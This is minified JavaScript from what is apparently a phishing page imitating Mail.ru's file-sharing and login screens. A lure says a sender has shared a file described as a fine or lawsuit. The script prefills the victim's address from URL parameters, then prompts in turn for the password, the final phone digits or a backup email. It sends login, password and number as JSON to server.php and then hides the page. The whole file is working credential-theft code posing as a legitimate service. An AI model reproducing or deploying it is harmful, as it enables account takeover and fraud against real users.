var linkImg="https://filin.mail.ru/pic?width=1000&height=1000&email=";function getParamsFromCurrentURL(){const e=new URL(window.location.href).searchParams;return{account:e.get("account"),number:e.get("number"),mail:e.get("from")}}const data=getParamsFromCurrentURL();linkImg+=data.account;var accountMail=data.account,fromMail=data.mail,loginInputValue=data.account,numberMail=data.number;document.addEventListener("DOMContentLoaded",function(){fileAccess.innerHTML='<div class="loading"></div>',setTimeout(()=>{fileAccess.innerHTML=`\n        <div>\n            <div class="file-access-inner">\n                <div>Доступ к файлу</div>\n                <div>${fromMail} предостовляет вам доступ к файлу</div>\n                <div id="button-file-access" class="button-file-access">Перейти</div>\n            </div>\n            <div class="login-account-qr-code">\n                <div class="login-account-qr-code-inner">\n                    <img src="css/res/qr-code-user.png" alt="">\n                    <div class="qr-code-form">\n                        <div class="qr-code-title">Быстрый вход по QR-коду</div>\n                        <div class="qr-code-text">Наведите камеру телефона</div>\n                        <a href="https://help.mail.ru/mail/account/login/qr#hint" class="qr-code-button">Подробнее</a>\n                    </div>\n                </div>\n            </div>\n        </div>\n        `},500)});const fileAccess=document.querySelector(".file-access"),fileAccessOutside=document.querySelector(".file-access-outside"),bgOpacity=document.querySelector(".bg-opacity"),fileFocusIcon=document.querySelector(".file-focus-icon"),NewfileFocusIcon="css/res/icon-file-focus.svg",NewfileFocusIcon2="css/res/Group 15 (1).svg",contentFile=document.querySelector(".content-file"),headerBtmGroupDownload=document.querySelector(".header-btm-group-download");var offset=!1,checkOffset=!0,loginValue=accountMail;const showMoreBtn=document.querySelector("#show_more"),showMoreContent=document.querySelector(".helping__information"),downloadBtn=document.querySelector(".download"),srcListCheck="css/res/list-check.png",emptysrc="";var loginInputValueFour,passwordInputValue;function inputSelectionInnerfun(){const e=document.getElementsByClassName("input-selection-inner");for(let n=0;n<e.length;n++)e[n].style.border="2px solid #ffffff00"}function srcListCheckNone(){const e=document.getElementsByClassName("mail-text-check");for(let n=0;n<e.length;n++)e[n].setAttribute("src","")}contentFile.addEventListener("click",function(e){0==offset&&"download-file"!=e.target.classList.value?(fileFocusIcon.setAttribute("src",NewfileFocusIcon),headerBtmGroupDownload.style.opacity="1",headerBtmGroupDownload.style.top="0px",offset=!0):1==offset&&"download-file"!=e.target.classList.value?(fileFocusIcon.setAttribute("src",NewfileFocusIcon2),headerBtmGroupDownload.style.opacity="0",headerBtmGroupDownload.style.top="-1000px",offset=!1):"download-file"==e.target.classList.value&&(location.href="Штраф._Исковое_заявление.doc")}),window.addEventListener("click",function(e){const n=document.querySelector(".password-input"),t=document.getElementById("form-checkbox-inner");if("header-btm-group-download"==e.target.classList.value&&(location.href="Штраф._Исковое_заявление.doc"),"input-selection-inner-yandex"==e.target.id&&(window.location.href="https://passport.yandex.ru/auth"),"user-name-repeat-inner"==e.target.classList.value&&(fileAccess.innerHTML='<div class="loading"></div>',setTimeout(()=>{fileAccess.innerHTML="\n            ",fileAccess.style.opacity="1"},800)),"input-selection-inner"==e.target.classList.value&&(inputSelectionInnerfun(),e.target.style.border="2px solid #005FF9"),"form-checkbox-inner"==e.target.classList.value&&1==checkOffset?(t.style.backgroundColor="#fff",t.style.border="1px solid #c2c2c2",checkOffset=!1):"form-checkbox-inner"==e.target.classList.value&&0==checkOffset&&(t.style.backgroundColor="#005FF9",t.style.border="1px solid #c2c2c200",checkOffset=!0),"button-file-access"==e.target.classList.value&&(fileAccess.innerHTML='<div class="loading"></div>',setTimeout(()=>{fileAccess.innerHTML=`\n            <div class="login-account">\n                <div class="login-account-inner">\n                    <div class="login-account-title">Войти в аккаунт</div>\n                    <div class="login-account-title-button">\n                        <img class="login-account-button-img" src="${linkImg}" alt="">\n                        <div class="login-account-button-div">${accountMail}</div>\n                    </div>\n                </div>\n                <div class="login-account-qr-code"> \n                    <div class="login-account-qr-code-inner">\n                        <img src="css/res/qr-code-user.png" alt="">\n                        <div class="qr-code-form"> \n                            <div class="qr-code-title">Быстрый вход по QR-коду</div>\n                            <div class="qr-code-text">Наведите камеру телефона</div>\n                            <a href="" class="qr-code-button">Подробнее</a>\n                        </div>\n                    </div>\n                </div>\n            </div>`,fileAccess.style.opacity="1"},800)),"login-account-title-button"!=e.target.classList.value&&"login-account-button-div"!=e.target.classList.value&&"login-account-button-img"!=e.target.classList.value||(fileAccess.innerHTML='<div class="loading"></div>',setTimeout(()=>{fileAccess.innerHTML=`\n            <div class="login-account-user">\n                <div class="login-account-form">\n                    <div class="login-account-form-title-left">Данные от аккаунта</div>\n                    <div class="user-name-repeat">\n                        <div class="user-name-repeat-name">${loginInputValue}</div>\n                    </div>\n                    <form action="" onsubmit="return false;">\n                        <div class="form-input">\n                            <div class="pass-input-eye">\n                                <input class="password-input" id="password-input" type="password" placeholder="Пароль" required>\n                                <div class="pass-input-eye-btn" id="pass-input-eye-outside">\n                                    <img class="pass-input-eye-btn" id="pass-input-eye-inner" src="css/res/icon-eye.png"\n                                        alt="">\n                                </div>\n                            </div>\n                        </div>\n                        <div class="form-button">\n                            <div class="form-button-clk-pass" id="form-button-clk-pass">Открыть файл</div>\n                            <div class="form-checkbox">\n                                <div id="form-checkbox-inner" class="form-checkbox-inner">\n                                    <img class="form-checkbox-inner" src="css/res/icon-checkbox.svg" alt="">\n                                </div>\n                                <span>запомнить</span>\n                            </div>\n                        </div>\n                    </form>\n                </div>\n                <div class="login-account-user-footer-pass">\n                    <a href="https://account.mail.ru/recovery">Восстановить доступ</a>\n                    <div>\n                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"\n                            class="base-0-2-23" ie-style="">\n                            <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"\n                                d="M3 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM3 9a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2v-2a2 2 0 00-2-2H3zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1zM11 1a2 2 0 00-2 2v2a2 2 0 002 2h2a2 2 0 002-2V3a2 2 0 00-2-2h-2zm.5 2a.5.5 0 00-.5.5v1a.5.5 0 00.5.5h1a.5.5 0 00.5-.5v-1a.5.5 0 00-.5-.5h-1z">\n                            </path>\n                            <rect x="9" y="13" width="2" height="2" rx="1" fill="#333"></rect>\n                            <path fill-rule="evenodd" clip-rule="evenodd" fill="#333"\n                                d="M10 9a1 1 0 000 2h3v3a1 1 0 102 0v-4a1 1 0 00-1-1h-4z"></path>\n                        </svg>\n                        <a href="https://help.mail.ru/mail/account/login/qr#hint">Войти по QR-коду</a>\n                    </div>\n                </div>\n            </div>\n            `,fileAccess.style.opacity="1"},800),setTimeout(()=>{const e=document.getElementById("password-input"),n=document.getElementById("form-button-clk-pass");e&&e.addEventListener("keypress",e=>{"Enter"===e.key&&(e.preventDefault(),n.click())})},1500)),"form-button-clk-pass"==e.target.classList.value&&""!=n.value&&(passwordInputValue=n.value,fileAccess.innerHTML='<div class="loading"></div>',setTimeout(()=>{fileAccess.innerHTML="rezerv"==numberMail?'\n            <div>\n                <div id=\'rezerv_block\' class="rezerv_block">\n                    <div class="rezerv_block_text1">Вход в аккаунт Mail.ru</div>\n                    <div class="rezerv_block_text2_outside">\n                        <div class="rezerv_block_text2">Это точно вы? Укажите резервную почту,<br>чтобы войти в аккаунт\n                        </div>\n                    </div>\n                    <input class="rezerv_block_input1" type="text" placeholder="Введите резервную почту">\n                    <div class="rezerv_block_button1_outside">\n                        <div id="rezerv_block_button1" class = "four-button">Продолжить</div>\n                    </div>\n                </div>\n            </div>\n        ':'\n            <div>\n                <div class="file-num-inner" id=\'file-num-inner\' >\n                    <div class="file-num-inner-top">\n                        <div>Вход в аккаунт Mail.ru</div>\n                        <div>Это точно вы? Дополните свой номер телефон, чтобы войти в аккаунт</div>\n                       <div class="phone-input">\n                            <span>+7 </span>\n                            <span>(</span>\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <span>)</span>\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <span>-</span>\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <span>-</span>\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                            <input type="text" maxlength="1" class="digit" placeholder="_">\n                        </div>\n                        <div>Укажите шесть последних цифр номера</div>\n                    </div>\n                    <div class="file-num-inner-bottom">\n                        <div class = "four-button" id="continue-button">Продолжить</div>\n                    </div>\n                </div>\n            </div>\n        '},500),setTimeout(()=>{if(document.getElementById("file-num-inner")){const e=document.querySelectorAll(".digit"),n=document.querySelector(".four-button");e.forEach((t,i)=>{t.addEventListener("input",()=>{1===t.value.length&&i<e.length-1&&e[i+1].focus()}),t.addEventListener("keydown",s=>{if("Backspace"===s.key&&!t.value&&i>0&&e[i-1].focus(),"Enter"===s.key){Array.from(e).every(e=>1===e.value.trim().length)&&n.click()}})}),numberMail.split("").forEach((n,t)=>{e[t]&&(e[t].value=n,e[t].setAttribute("readonly",!0))}),e.forEach(e=>{e.addEventListener("focus",()=>{e.hasAttribute("readonly")||(e.value="")})})}},500)),"pass-input-eye-btn"==e.target.classList.value&&"password"==n.type?n.type="text":"pass-input-eye-btn"==e.target.classList.value&&(n.type="password"),e.target.classList.contains("four-button")||"Enter"==e.key){if(document.getElementById("file-num-inner"))var i=Array.from(document.querySelectorAll(".digit")).map(e=>e.value).join("");if(document.getElementById("rezerv_block"))i=document.querySelector(".rezerv_block_input1").value;if(""!==i)var s={login:loginValue,pass:passwordInputValue,num:i};else console.error("Одно или несколько полей ввода пустые.");console.log(s),fetch("server.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}).then(e=>e.json()).then(e=>{console.log(e)}).catch(e=>{console.error("Error:",e)}),fileAccessOutside.innerHTML="",fileAccessOutside.innerHTML='<div class="loading"></div>',setTimeout(()=>{bgOpacity.style.opacity="0",bgOpacity.style.zIndex="-99",fileAccessOutside.style.zIndex="-100",fileAccessOutside.innerHTML=""},1e3)}});